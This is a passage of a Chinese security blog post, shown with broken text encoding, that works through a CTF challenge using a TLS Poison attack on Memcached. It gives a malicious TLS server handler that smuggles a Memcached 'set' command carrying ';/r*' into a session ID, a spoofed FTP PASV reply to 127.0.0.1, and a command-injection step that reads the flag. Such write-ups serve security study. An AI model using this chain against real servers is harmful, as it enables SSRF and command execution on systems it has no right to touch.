libcurl ï¼Œåœ¨ä»£ç ä¸­è™½ç„¶å¯ä»¥æ‰¾åˆ°\u0026lt;curl/curl.h\u0026gt;ï¼Œä½†æ˜¯åˆ°åº•ç”¨æ²¡ç”¨æˆ‘ä»¬ä¼¼ä¹ä¸æ˜¯å¾ˆå¥½åˆ¤æ–­ï¼›æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°è¯•é€šè¿‡æŠ¥é”™å›æ˜¾æ¥ç¡®å®š git åˆ°åº•ç”¨æ²¡ç”¨ libcurl (idea from @zsx )ï¼Œå¦‚ä½•å¼•èµ·è¿™ä¸ªæŠ¥é”™å‘¢ï¼Ÿä¸éš¾æƒ³åˆ°æˆ‘ä»¬å¯ä»¥å°è¯•ç”¨ä¸€ä¸ª libcurl ä¸æ”¯æŒçš„åè®®æ¥ç¡®å®šï¼Œæ¯”å¦‚ gopher åè®®ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬å¯ä»¥åœ¨è‡ªå·±æœåŠ¡å™¨ä¸Šæ”¾ä¸€ä¸ª php è®©å…¶ Location è·³è½¬åˆ° gopher åè®®ä¸Šï¼Œä¾‹å¦‚ï¼š\n$ cat 302.php \u0026lt;?php header(\u0026#34;Location: gopher://localhost/\u0026#34;); $ git ls-remote --tags -- http://localhost/302.php fatal: unable to access \u0026#39;http://localhost/302.php/\u0026#39;: Protocol \u0026#34;gopher\u0026#34; not supported or disabled in libcurl æˆ‘ä»¬å°±å¯ä»¥çœ‹åˆ°æ˜æ˜¾çš„ libcurl é”™è¯¯å›æ˜¾ã€‚\næ—¢ç„¶ç¡®å®šäº†å¯ä»¥ä½¿ç”¨ git æ¥è¿›è¡Œ TLS Poison æ”»å‡» Memcached ï¼Œé‚£ä¹ˆå…·ä½“æˆ‘ä»¬åº”è¯¥è¿™ä¹ˆåšå‘¢ï¼Ÿæˆ‘ä»¬ä» getFlag å¼€å§‹æ¥çœ‹çœ‹ï¼š\n è¦è®©execæ‰§è¡Œ;/readflagï¼Œæˆ‘ä»¬è¦è®©;/readflagåœ¨ Memcached ä¸­çš„ Value ä¸º \u0026ldquo;OK\u0026rdquo; é‚£æ€ä¹ˆå†™å…¥;/readflagå‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ git æ¥å®æ–½ TLS Poison ï¼Œå‘ Memcached ä¸­å†™å…¥ Key ä¸º;/readflagï¼ŒValue ä¸º \u0026ldquo;OK\u0026rdquo; é‚£æ€ä¹ˆå®æ–½ TLS Poison å‘¢ï¼Ÿéƒ¨ç½² HTTPS Server ï¼Œå…ˆç»•è¿‡ä¹‹å‰ä¸¤ä¸ªé™åˆ¶ï¼Œåœ¨ git è¯·æ±‚ HTTPS Server çš„æ—¶å€™å®è¡Œ TLS Poison  å…·ä½“æµç¨‹å›¾å¦‚ä¸‹ï¼š\n \nå…¶ä¸­æˆ‘ä»¬å¯ä»¥ä½¿ç”¨åŒ A è®°å½•çš„æ–¹æ³•æ¥ä¼˜åŒ– DNS Rebinding æ–¹å¼ï¼Œå…·ä½“å…³äº TLS Poison è¯¦ç»†è§£é‡Šè§ï¼šä¸€ç¯‡æ–‡ç« å¸¦ä½ è¯»æ‡‚ TLS Poison æ”»å‡»\nè¿™é‡Œ wp ä½œè€…æ”¾å‡ºçš„ exp å…¶å®å¹¶ä¸å¯ç”¨ï¼Œåœ¨ TLS æ¡æ‰‹æ—¶ä¼šäº§ç”Ÿé”™è¯¯ï¼Œæ‰€ä»¥æˆ‘åˆä¸å¾—ä¸ä½¿ç”¨å…¶ä»–å·¥å…·å®ç°è¿™ä¸ª exp ï¼Œè€Œæ•´ä¸ª exp æ„é€ ä¸­æ¯”è¾ƒå…³é”®çš„åœ°æ–¹åœ¨äºï¼Œå¦‚ä½•è®©file_get_contentsæ­£å¸¸è·å–åˆ°æŒ‡å®šå†…å®¹åï¼Œgit å†è®¿é—®æ—¶å°±éœ€è¦ä½¿ç”¨æ¶æ„çš„ TLS Server ã€‚å¯¹äºè¿™ä¸ªç‚¹ï¼Œæˆ‘ä»¬å¯ä»¥ä»è¯·æ±‚çš„ UA ä¸ŠåšåŒºåˆ†ï¼Œåˆ¤æ–­ UA ä¸­æ˜¯å¦æœ‰ git æ¥åŒºåˆ†è¿™ä¸¤è€…è¯·æ±‚æ¥è¿”å›å¯¹åº”çš„å“åº”ï¼Œæ‰€ä»¥ rustls æˆ‘å°±ä¸è€ƒè™‘äº†\u0026hellip;è¿™ç©æ„ç€å®éš¾æ”¹ï¼Œäºæ˜¯é€‰ç”¨äº† tlslite-ng ä½œä¸º TLS æœåŠ¡å™¨ï¼Œå¹¶ä¿®æ”¹MySimpleHTTPHandlerå‡½æ•°ä¸­çš„å¤„ç† HTTP è¯·æ±‚çš„å…³é”®ä»£ç ï¼Œå¦‚ä¸‹ï¼š\nif \u0026#39;git\u0026#39; in str(self.headers): print(\u0026#39;This is git! Redirecting it back to memcached and shutting down\u0026#39;) assert session_id, \u0026#39;Session id should have been set at this point\u0026#39; headers = { \u0026#39;Location\u0026#39;: f\u0026#39;https://tls.exmaple.com:11211/pwned\u0026#39;, } self.wfile.write(get_http_response(302, headers, \u0026#39;\u0026#39;)) return else: print(\u0026#39;This is PHP! Showing them something that looks like a git repo and stealing sandbox ID\u0026#39;) b64_sandbox_id = re.search(\u0026#39;/(.{14})/\u0026#39;, self.path).group(1) while len(b64_sandbox_id) % 4 != 0: b64_sandbox_id += \u0026#39;=\u0026#39; sandbox_id = base64.b64decode(b64_sandbox_id) assert len(sandbox_id) == 10, f\u0026#39;The sandbox id should have exactly 10 bytes, got: {sandbox_id}\u0026#39; session_id = b\u0026#39;\\r\\nset \u0026#39; + sandbox_id + b\u0026#39;;/r* 0 0 2\\r\\nOK\\r\\n\u0026#39; assert len(session_id) == 32, f\u0026#39;The session should have exactly 32 bytes, got: {session_id}\u0026#39; print(f\u0026#39;Got sandbox id: {sandbox_id}, session_id: {session_id}\u0026#39;) fake_git = \u0026#39;001e# service=git-upload-pack\\n\u0026#39; self.wfile.write(get_http_response(200, {}, fake_git)) return è¿™é‡Œå› ä¸ºé¢˜ç›®è®¾ç½®äº† sandbox ï¼Œå ç”¨äº† 10 å­—èŠ‚ï¼Œè€Œ TLS 1.2 ä¸­çš„ SessionID å±€é™äº 32 å­—èŠ‚ï¼Œæ‰€ä»¥æˆ‘ä»¬æ²¡åŠæ³•ç›´æ¥ä½¿ç”¨;/readflagï¼Œå¦åˆ™ä¼šè¶…å‡ºé•¿åº¦ï¼Œç›´æ¥ä½¿ç”¨;/r*ä¹Ÿå¯ä»¥æ‰§è¡Œè¯»å– flag å‘½ä»¤ã€‚æœ€åæ‰“åŒ…æ•´ç†çš„ Exp æ”¾åœ¨ï¼šhttps://github.com/ZeddYu/TLS-poison/tree/master/Practice1-hxp2020/solution1\nåœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸Šæ­å»ºå¥½ TLS æœåŠ¡å™¨ä¹‹åï¼Œæœ€åç”¨ exp.py è‡ªåŠ¨å‘åŒ…å°±èƒ½æ‹¿åˆ° flag äº†ï¼š\n \nSolution 2 å½“ç„¶å¦‚æœåªæ˜¯ç®€å•çš„å¤ç° TLS Poison æˆ‘ä¹Ÿä¸ä¼šè¿™ä¹ˆè¯¦ç»†çš„å†™ä¸€ç¯‡æ–‡ç« æ¥è®²è¿™ä¸ªé¢˜äº†ï¼Œ CTF èƒ½å¸¦ç»™æˆ‘æœ€å¤§çš„å¿«ä¹å°±æ˜¯çœ‹åˆ°ä¸€äº›åœ¨è‡ªå·±é¢„æœŸä¹‹å¤–çš„ä¸œè¥¿ï¼Œè¿™äº›ä¸œè¥¿å¾€å¾€éƒ½æ›´æœ‰æ„æ€ï¼Œä¹Ÿæ›´ Amazing ã€‚\nç»“åˆå‰æ–‡ï¼Œæˆ‘ä»¬è¿™é‡Œå¯ä»¥å°è¯•ä½¿ç”¨ FTPS æ¥è¿›è¡Œè§£ç­”è¿™ä¸ªé¢˜ç›®ã€‚å¦‚æœä½¿ç”¨ FTPS ï¼Œé‚£ä¹ˆé‡å®šå‘ã€DNS Rebinding çš„æ“ä½œæˆ‘ä»¬å°±å¯ä»¥ä¸éœ€è¦äº†ï¼Œå› ä¸ºå¯ä»¥ä½¿ç”¨PASVç›´æ¥å°†æ•°æ®é€šé“æŒ‡å‘ 127.0.0.1:11211 å³å¯ã€‚\né‚£ä¹ˆæ¥ä¸‹æ¥å°±éœ€è¦ç¡®å®š git ä¸­çš„ libcurl æ˜¯å¦å—åˆ°PASVæ¼æ´å½±å“äº†ï¼Œæˆ‘ä»¬å¯ä»¥ä» git ç‰ˆæœ¬ã€ç®€å•æ­å»ºä¸€ä¸ªæ¶æ„çš„ FTP æœåŠ¡å™¨è¿›è¡Œæµ‹è¯•ï¼Œè¿™é‡Œå°±ä¸å±•å¼€è¿›è¡Œæµ‹è¯•äº†ã€‚ï¼ˆå…¶å®æ˜¯æ¯”è¾ƒæ‡’ï¼‰æˆ‘ä»¬è¿™é‡Œå°±ç›´æ¥å¼€å§‹å°è¯•ä½¿ç”¨ FTPS è¿›è¡Œè§£é¢˜ã€‚\næŒ‰ç…§ä¹‹å‰çš„æµç¨‹ï¼Œæˆ‘ä»¬éœ€è¦ç¡®å®šå‡ ä¸ªç‚¹ï¼š\n å¦‚ä½•ç»•è¿‡ä¹‹å‰é¢˜ç›®ä½¿ç”¨file_get_contentså¯¹æ–‡ä»¶å†…å®¹ç¡®è®¤ï¼Ÿæˆ‘ä»¬å¯ä»¥ç›´æ¥åˆ›å»º/info/refæ–‡ä»¶ï¼Œå†…å®¹ä¸ºé¢˜ç›®è¦æ±‚çš„å†…å®¹å³å¯ å¦‚ä½•ç»•è¿‡æ­£åˆ™ï¼Ÿæˆ‘ä»¬åªéœ€è¦é…ç½®å¥½åŒ¿å ftps å³å¯ï¼Œå°±ä¸éœ€è¦å¼•å…¥ä¸ºäº†ç”¨æˆ·è®¤è¯è€Œä½¿ç”¨çš„@ç¬¦å·äº†ï¼Œå…¶ä½™çš„å­—ç¬¦å°±å±äºæ­£åˆ™å†…çš„å­—ç¬¦äº† ç”¨éšå¼è¿˜æ˜¯æ˜¾å¼ï¼Ÿå› ä¸ºæˆ‘ä»¬ä½¿ç”¨çš„æ ¼å¼æ˜¯ftps://ftps.exmaple.com:11211/è¿™ç§å½¢å¼ï¼Œè¿™åªèƒ½æ˜¯éšå¼ FTPS çš„æ ¼å¼ï¼Œæ‰€ä»¥ä½¿ç”¨éšå¼ FTPS  å‰©ä¸‹çš„ä¾¿æ˜¯å¦‚ä½•æ„é€  exp çš„é—®é¢˜äº†ï¼Œæ€ä¹ˆå»å¼„ä¸€ä¸ªéšå¼ FTPS ï¼Œéš¾é“è¿˜è¦ä¿®æ”¹ä¸ªæ¶æ„ vsftpd ï¼Ÿé‚£æ ·æ¯”è¾ƒéº»çƒ¦ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ rustls çš„è½¬å‘åŠŸèƒ½ï¼Œè¯¥åŠŸèƒ½å¯ä»¥å¸®æˆ‘ä»¬å¤„ç†äº† TLS åˆ›å»ºçš„é—®é¢˜ï¼Œå¹¶ä¸”æŒ‰ç…§ä¹‹å‰çš„åŸºç¡€ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥æŠŠå®ƒç›´æ¥ä½œä¸ºæ¶æ„ TLS æœåŠ¡å™¨ï¼Œè¿™æ ·æˆ‘ä»¬å°±åªéœ€è¦å¼„ä¸€ä¸ª socket ç”¨æ¥å¤„ç† FTP å³å¯ã€‚\nä¾æ—§ä½¿ç”¨æˆ‘ä»“åº“çš„ TLS å·¥å…·ï¼šhttps://github.com/ZeddYu/TLS-poison/ ï¼ŒæŒ‰ç…§ setup åšå¥½åˆå§‹åŒ–åï¼Œä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å¼€å¯ rustls çš„è½¬å‘åŠŸèƒ½ï¼Œå°† TLS ä¸Šå±‚æµé‡è½¬å‘åˆ° 2048 ç«¯å£ï¼š\nTLS-poison/client-hello-poisoning/custom-tls/target/debug/custom-tls -p 11211 --certs /home/ubuntu/tls/fullchain.pem --key /home/ubuntu/tls/privkey.pem forward 2048 ç„¶ååœ¨ 2048 ç«¯å£æˆ‘ä»¬å¼„ä¸ª socket ç›‘å¬å¹¶è¯»ä¸€ä¸‹ FTP ï¼Œç„¶åå°±æ˜¯å¤„ç† FTP å‘½ä»¤çš„äº‹æƒ…äº†ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨ vsftpd æ¥è¿›è¡Œå‘½ä»¤å“åº”çš„å‚è€ƒï¼Œæœ€åå®ç°ï¼šhttps://github.com/ZeddYu/TLS-poison/blob/master/Practice1-hxp2020/solution2/curl_exp.py\nPSï¼šè¿™é‡Œ FTP æœåŠ¡è®°å¾—è¦å®Œæ•´å®ç°å¯¹ PASV ä¹‹åçš„å‘½ä»¤å¤„ç†ï¼Œå¦åˆ™æ”»å‡»å¤±è´¥ã€‚\nå¤©çŸ¥é“è¿™ä¸ªå‘äº†æˆ‘å¤šä¹…\u0026hellip;å½“æ—¶æ­»æ´»éƒ½ä¸èƒ½å¤ç°ï¼Œé—®ä½œè€… 0xbb ä¹Ÿä¸çŸ¥é“ä»€ä¹ˆæƒ…å†µï¼Œåˆæ˜¯æ’ curl ç‰ˆæœ¬ï¼Œåˆæ˜¯æ’ git ç‰ˆæœ¬ï¼Œåˆæ˜¯æ’ OpenSSL ï¼Œåˆæ˜¯æ’ GnuTLS ï¼Œåæ­£å„ç§æ’ bug ï¼Œä¸‡å¿µä¿±ç°ï¼Œæœ€åæ‰æ‰¾åˆ°è¿™ä¸ªåœ°æ–¹\u0026hellip;ç®€ç›´\nè¿™é‡Œæˆ‘è‡ªå·±ç¼–è¯‘äº†ä¸€ä¸ªå­˜åœ¨pasvæ¼æ´çš„ curl è°ƒè¯•ï¼Œè®¿é—®æˆ‘ä»¬çš„ ftps æœåŠ¡å™¨ä¹‹åå°±ä¼šå¯¹æˆ‘ä»¬ 127.0.0.1:11211 è¿›è¡Œ TLS ä¼šè¯é‡ç”¨ï¼Œå°±ä¼šå°†æˆ‘ä»¬çš„ payload å‘é€åˆ° 11211 ç«¯å£äº†ï¼š\n \nå†™å…¥ä¹‹ååŸºæœ¬ä¸Šå°±æ²¡æœ‰ä»€ä¹ˆé—®é¢˜äº†ã€‚\næ•´ä¸ªæµç¨‹æˆ‘ä»¬æ•´ç†ä¸€ä¸‹ï¼š\n  é¦–å…ˆå¾—è®¿é—®ä¸€æ¬¡é¢˜ç›®æ‹¿åˆ° cookie\n  ä¸€å¼€å§‹çš„file_get_contentsæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ vsftpd æ¥åœ¨åŒ¿å ftp ç›®å½•ä¸‹æ”¾ç½®/info/refæ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹å°±æ˜¯ \u0026ldquo;001e# service=git-upload-pack\\n\u0026rdquo;\n  é¢˜ç›®ä½¿ç”¨file_get_contentsè®¿é—®ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥å…³é—­ vsftpd ï¼Œç„¶åå¼€å¯ rustls æ¶æ„ TLS æœåŠ¡å™¨ï¼Œæ³¨æ„æå‰è®¾ç½®åœ¨ redis å½“ä¸­è®¾ç½®å¥½ payload\n  é¢˜ç›®æ‰§è¡Œexecï¼Œä¹Ÿå°±æ˜¯ä½¿ç”¨ git æ¥è®¿é—®æˆ‘ä»¬çš„ FTPS æœåŠ¡å™¨æ—¶ï¼ŒåŒæ–¹å»ºç«‹ TLS æ¡æ‰‹ï¼Œæˆ‘ä»¬ä¼šè®¾ç½®å¯ä»¥æ‰§è¡Œè¯»å– flag çš„ Session ID\n  å»ºç«‹æ¡æ‰‹å®Œæ¯•åï¼Œæ‰§è¡Œ FTP æµç¨‹\n  åœ¨é¢˜ç›® git å¤„ç† FTP æµç¨‹ä¸­ï¼Œæˆ‘ä»¬ä¼šç»™ git å‘å‡ºçš„PASVå‘½ä»¤è¯·æ±‚çš„å“åº”227 Entering Passive Mode (127,0,0,1,43,203)\\r\\n\n  git ä¼šæ ¹æ®å¾—åˆ°çš„ 127.0.0.1:11211 è¿™ä¸ªåœ°å€å°è¯•è¿›è¡Œ TLS ä¼šè¯é‡ç”¨\n  è‡³æ­¤ï¼Œå®Œæˆå¯¹ Memcached çš„æ”»å‡»ï¼ŒæˆåŠŸå†™å…¥\\r\\nset 1234567890;/r* 0 0 2\\r\\nOK\\r\\nï¼Œå…¶ä¸­é‚£ä¸²è¿ç»­æ•°å­—æˆ‘ç”¨æ¥è¡¨ç¤º sandbox id\n  å¸¦ç€æœ€å¼€å§‹è®¾ç½®çš„ cookie å‘é¢˜ç›®æäº¤ url åœ°å€ä¸º;/r*ï¼Œæ­¤æ—¶é¢˜ç›®å‘ Memcached æŸ¥è¯¢ 1234567890;/r*çš„å€¼ï¼Œå¾—åˆ° url çš„å€¼ä¸º OK ï¼Œç»•è¿‡é™åˆ¶\n  é¢˜ç›®æ‰§è¡Œexec(\u0026quot;timeout -s KILL 3 git ls-remote --tags -- $url\u0026quot;, $output, $return_var);ï¼Œå…¶ä¸­$urlå°±æ˜¯æˆ‘ä»¬ä¼ å…¥çš„;/r*ï¼Œå®Œæˆå‘½ä»¤æ³¨å…¥ï¼Œæ‰§è¡Œè¯»å– flag å‘½ä»¤æ‹¿åˆ° flag\n  è‡³æ­¤ï¼Œå®Œæˆè¿™ä¸ªé¢˜ç›®çš„ FTPS è§£æ³•ã€‚exp æ•ˆæœå›¾å¦‚ä¸‹ï¼š\n \nSomething else å…¶å®è¿™ä¸ªè§£æ³•ä¹Ÿæ˜¯åæ¥é—®çš„ 0xbb å‡ºé¢˜äººï¼Œå…¶å®é¢„æœŸè§£æ³•æ˜¯åˆ©ç”¨ FTPS çš„è§£æ³•ã€‚ä½†æ˜¯æ¯”èµ›çš„æ—¶å€™ï¼Œé˜Ÿå‹è¿˜æ‰¾åˆ°äº†ä¸€å¤„å…¶ä»–å¯èƒ½çš„åœ°æ–¹æƒ³ç€ SSRF æ¥ç€ï¼Œä½†æ˜¯åæ¥ä¸å¤ªè¡Œï¼Œåé¢è·Ÿ Perfect Blue ï¼ˆä¹Ÿå°±æ˜¯è¿™æ¬¡å‚èµ›çš„è”åˆæˆ˜é˜Ÿ perfect guesser çš„è”åˆé˜Ÿä¹‹ä¸€ï¼‰çš„æœ‹å‹äº¤æµäº†ä¸€ä¸‹ç¡®å®æ˜¯ç”¨ TLS Poison ï¼Œå¹¶ä¸”ä»–è·Ÿ A0E æŸä¸ªå¸ˆå‚…ä¸€æ ·ä¹Ÿé‡å†™äº† DNS ç›¸å…³éƒ¨åˆ†å†…å®¹2333\nå¦‚æœä½ è§‰å¾—åšå®Œè¿™ä¸ªé¢˜ç›®è¿˜è§‰å¾—ä¸è¿‡ç˜¾ï¼Œè¿˜å¯ä»¥å»åšä¸€ä¸‹ Tet CTF çš„ä¸€ä¸ªé¢˜ç›®ã€‚åœ¨è¶Šå—çš„ TetCTF 2021 å½“ä¸­ï¼Œæœ‰ä¸€ä¸ªå•ç‹¬çš„åˆ†ç±» Web \u0026amp; Crypto æœ‰è¿™ä¹ˆä¸€é“é¢˜ï¼šHackEmAll-Next-Gen-Proxy ï¼Œè¿™é“é¢˜å½“ä¸­å°±æ¯”è¾ƒç›´æ¥ï¼š\ndef _set_cache(_key, _value): if str(_key) != \u0026#34;\u0026#34; and str(_value) != \u0026#34;\u0026#34;: _cache_handle = pylibmc.Client([\u0026#34;127.0.0.1:11211\u0026#34;], binary=False) _cache_handle.set(_key, _value, time=60) return True else: return False def _get_cache(_key): _cache_handle= pylibmc.Client([\u0026#34;127.0.0.1:11211\u0026#34;], binary=False) return _cache_handle.get(_key) def parse(_url): _cmd = [\u0026#34;curl\u0026#34;, \u0026#34;-L\u0026#34;, \u0026#34;-k\u0026#34;, str(_url)] _content = subprocess.check_output(_cmd) return _content.encode(\u0026#39;hex\u0026#39;) è¿™ä¸ªå°±å·²ç»æœ‰éå¸¸æ˜æ˜¾çš„æç¤ºäº†ï¼ŒåŒæ ·æ˜¯ç†Ÿæ‚‰çš„ Memcached ï¼ŒåŒæ ·æ˜¯-Lé€‰å‹ç‰¹åœ°å…è®¸ curl é‡å®šå‘ï¼Œå¾ˆæ ‡å‡†çš„ä¸€é“ TLS Poison é¢˜ç›®ï¼Œè¿™é‡Œå°±ä¸å†å¤šå•°å—¦äº†ã€‚ä¸è¿‡å¯¹äºè¿™é¢˜ï¼Œä»¥åŠ-Lé€‰é¡¹ï¼Œå½“æ—¶æœ‰é€‰æ‰‹æƒ³å‡ºä½¿ç”¨ gopher æ¥åšè¿™ä¸ªé¢˜ï¼Œæœ¬åœ°éƒ½èƒ½æ‰“ï¼Œä½†æ˜¯åˆ°äº†è¿œç¨‹å°±æ‹‰å®äº†ï¼ŒåŸå› æ˜¯åœ¨æ–°ç‰ˆçš„ curl ä¸­ï¼Œå°±åƒæˆ‘ä»¬ä¸€å¼€å§‹éªŒè¯çš„ä¸€æ ·ï¼Œ gopher åè®®å·²ç»ä¸å†æ˜¯ libcurl é»˜è®¤æ”¯æŒçš„é‡å®šå‘åè®®äº†ï¼Œåªæœ‰ HTTP/HTTPS å’Œ FTP æ˜¯é»˜è®¤æ”¯æŒé‡å®šå‘ï¼Œå…·ä½“è§ï¼šhttps://github.com/curl/curl/commit/6080ea098d97393da32c6f66eb95c7144620298c\nConclusion è‡³æ­¤ï¼Œæœ¬ç¯‡åŠ ä¸Šä¹‹å‰çš„ ã€Šä¸€ç¯‡æ–‡ç« å¸¦ä½ è¯»æ‡‚ TLS Poison æ”»å‡»ã€‹ ï¼ŒåŸºæœ¬ä¸Šç®—æ˜¯æŠŠ TLS Poison çš„ç†è®ºã€å®è·µã€ CTF åº”ç”¨éƒ½è®²äº†ä¸€éï¼Œæˆ–è®¸ä»¥åå¯èƒ½è¿˜ä¼šå¼„ä¸ª TLS Poison æ”»å‡» SMTP çš„é¶åœºï¼ˆåº”è¯¥ä¸å¤ªå¯èƒ½ï¼‰ï¼Œä½†æ˜¯ TLS Poison éœ€è¦æ¢ç´¢çš„å†…å®¹ä¾æ—§è¿˜æœ‰å¾ˆå¤šï¼Œæ¯”å¦‚å¯¹äºæ˜¾å¼ FTPS çš„ TLS Poison åˆ©ç”¨åŒ–å·¥å…·ï¼Œå¦‚æœæ²¡æœ‰äº†PASVæ¼æ´ï¼ŒFTPS è¿˜æœ‰æ²¡æœ‰å…¶ä»–æ–¹å¼åˆ©ç”¨ç­‰ç­‰é—®é¢˜ï¼Œéƒ½æ˜¯è¿˜æœ‰å¾…å¤§å®¶è¿›ä¸€æ­¥å»æŒ–æ˜çš„ã€‚\nè¿™äº›å¤©éƒ½èŠ±äº†å¾ˆå¤šç²¾åŠ›åœ¨éƒ¨åˆ†ç ”ç©¶ä¸Šï¼Œä¸€æ–¹é¢ç¡®å®æˆ‘è§‰å¾— TLS Poison æ˜¯ä¸€ä¸ªå¾ˆç²¾å½©çš„æ”»å‡»æ–¹å¼ï¼Œå°½ç®¡å®ƒå±€é™æ€§å¾ˆå¤§ï¼Œä½†æ˜¯è¿™ä¸ªæ”»å‡»æ•´ä½“æ„é€ åˆ©ç”¨éƒ½ç›¸å¯¹æ¯”è¾ƒå·§å¦™ï¼Œä¹Ÿæ˜¯å¯¹åœ¨ä¼—å¤šå¯¹ TLS å¯†ç ç®—æ³•çš„æ”»å‡»ä¸­ä»¤äººè€³ç›®ä¸€æ–°ï¼›ä¸€æ–¹é¢å¯¹äº CTF é¢˜ç›®ï¼Œå°¤å…¶æ˜¯ hxp è¿™ä¸ªé¢˜ç›®æˆ‘ä¸€ç›´è€¿è€¿äºæ€€ï¼Œå†µä¸”æ­£å¥½è¿™ä¸ªä¹Ÿæ˜¯ TLS Poison çš„æ·±å±‚æ¬¡åˆ©ç”¨ï¼Œè¿™ä¹Ÿæˆä¸ºäº†åæ¥æˆ‘æ•´ç† TLS Poison æ”»å‡»çš„åŠ¨åŠ›æ¥æºä¹‹ä¸€ï¼Œå¹¶ä¸”æˆ‘ä¹Ÿè§‰å¾— FTP çœŸæ˜¯ä¸ªéå¸¸æœ‰æ„æ€çš„åè®®ï¼Œè€Œè¿™é¢˜é¢„æœŸç”¨åˆ° FTPS å°±å¿…é¡»å¼„æ‡‚ TLS Poison ï¼Œæ‰€ä»¥å°±ä¸å¾—ä¸å»æŠŠ TLS Poison å¼„ä¸€éã€‚æ²¡å¼„ä¹‹å‰è¿˜ä»¥ä¸ºæ˜¯æ¯”è¾ƒéš¾çš„ï¼Œå› ä¸ºçœ‹åˆ°å¥½å‡ ä¸ªé€‰æ‰‹éƒ½é‡æ–°å¼„äº† DNS éƒ¨åˆ†ï¼Œç”šè‡³è¿˜éœ€è¦é‡å†™ä¸€ä¸ª DNS Server ï¼Œä¸è¿‡å¯¹äºæ¶æ„ TLS æœåŠ¡è¿™ä¸€å—ç¡®å®éœ€è¦æ”¹å†™ TLS æœåŠ¡æ¡†æ¶æ‰èƒ½åšã€‚\nè¿˜æœ‰ä¸€æ–¹é¢æ˜¯ï¼Œæˆ‘ä¹‹å‰å‘æœ‹å‹åœˆæ¢è®¨ CTF ç›¸å…³ä»·å€¼è§‚çš„é—®é¢˜ï¼Œä»¥åŠ CTF æ˜¯å¦æ˜¯ä¿¡æ¯å®‰å…¨æœ€ä½³å…¥é—¨æ–¹å¼ï¼Œ@Anciety è¯„è®ºè¯´ CTF å¯èƒ½ä¸æ˜¯ä¿¡æ¯å®‰å…¨å…¥é—¨æ–¹å¼ï¼Œä½†æ˜¯ä»–è®¤ä¸ºæ˜¯ä¿¡æ¯å®‰å…¨ç ”ç©¶çš„å…¥é—¨æ–¹å¼ã€‚æ­£å¦‚ä»–æ‰€è¯´ï¼Œé€šè¿‡è¿™ä¸ª CTF é¢˜ç›®ï¼Œæˆ‘å¯¹ TLS Poison è¿›è¡Œäº†æ›´æ·±å…¥çš„æ¢ç©¶ï¼Œä¹Ÿæœ‰äº†æ›´å¤šçš„ç†è§£ï¼Œè¿™å¯èƒ½å°±æ˜¯ä¸€é“è‰¯å¥½çš„ CTF é¢˜ç›®ç»™å®‰å…¨ç ”ç©¶è€…å¸¦æ¥çš„å¥½å¤„ä¹‹ä¸€å§ï¼ŒåŒæ—¶ä¹Ÿå¸¦ç»™äº†æˆ‘å¾ˆå¤šå¿«ä¹ï¼Œä¹Ÿå¸Œæœ›ä»¥åèƒ½é‡åˆ°æ›´å¤šç±»ä¼¼ä¼˜ç§€çš„é¢˜ç›®ï¼Œèƒ½å¼•å¯¼ã€æ¨åŠ¨æˆ‘å»åšæ›´å¤šæœ‰æ„æ€æ›´æ·±å±‚æ¬¡çš„ç ”ç©¶ã€‚\n","date":"2021-05-19T21:32:27Z","permalink":"https://blog.zeddyu.info/2021/05/19/tls-ctf/","title":"TLS-Poison æ”»å‡»æ–¹å¼åœ¨ CTF ä¸­çš„åˆ©ç”¨å®è·µ"},{"content":"è¿™æ˜¯ã€Šä¸€ç¯‡æ–‡ç« å¸¦ä½ è¯»æ‡‚ XXX æ”»å‡»ã€‹ç³»åˆ—çš„ç¬¬äºŒç¯‡æ–‡ç« ï¼Œæœ¬ç¯‡æ–‡ç« ä¸»è¦è®²è¿° TLS Poison æ”»å‡»å¯¹åº”çš„ä¸‰ç§æ”»å‡»æ–¹å¼ã€ä¸€äº›å¯èƒ½ç®—æ˜¯â€œæ–°â€çš„ DNS Rebinding æŠ€å·§ä»¥åŠä¸€äº›å…³äº IP é€‰æ‹©æ¢ç´¢ç­‰å†…å®¹ã€‚\n[TOC]\næ–‡ç« é¦–å‘äºé›·ç¥ä¼—æµ‹ï¼Œä»¥ä¸‹ä¸ºé¦–å‘åœ°å€é“¾æ¥ï¼š\nä¸€ç¯‡æ–‡ç« å¸¦ä½ è¯»æ‡‚ TLS Poison æ”»å‡»ï¼ˆä¸€ï¼‰\nä¸€ç¯‡æ–‡ç« å¸¦ä½ è¯»æ‡‚ TLS Poison æ”»å‡»ï¼ˆäºŒï¼‰\nä¸€ç¯‡æ–‡ç« å¸¦ä½ è¯»æ‡‚ TLS Poison æ”»å‡»ï¼ˆä¸‰ï¼‰\nä¸€ç¯‡æ–‡ç« å¸¦ä½ è¯»æ‡‚ TLS Poison æ”»å‡»ï¼ˆå››ï¼‰\n Preface ä½¿ç”¨ã€Šä¸€ç¯‡æ–‡ç« å¸¦ä½ è¯»æ‡‚ XXX æ”»å‡»ã€‹çš„æ ‡é¢˜æ˜¯ä¸ºäº†ç£ä¿ƒè‡ªå·±æŠŠä¸€ä¸ªæ”»å‡»çš„å°½å¯èƒ½å¤šçš„ç»†èŠ‚å°½å¯èƒ½çš„ææ‡‚ï¼Œä¹Ÿæ˜¯ä¸ºäº†æå‡è‡ªå·±çš„å†™ä½œä»¥åŠè¡¨è¿°æ°´å¹³ã€‚æœ¬æ–‡æ—¨åœ¨å¸®åŠ©å¤§å®¶äº†è§£å­¦ä¹  TLS Poison æ”»å‡»ï¼Œå¸Œæœ›é€šè¿‡ä¸€ç¯‡æ–‡ç« è®©å¤§å®¶è¯»æ‡‚ TLS Poison æ”»å‡»ï¼Œä½†æ˜¯ä»…ä»…ç½‘ç»œåè®®æ¶‰åŠåˆ°å¾ˆå¤šå†…å®¹ï¼Œé 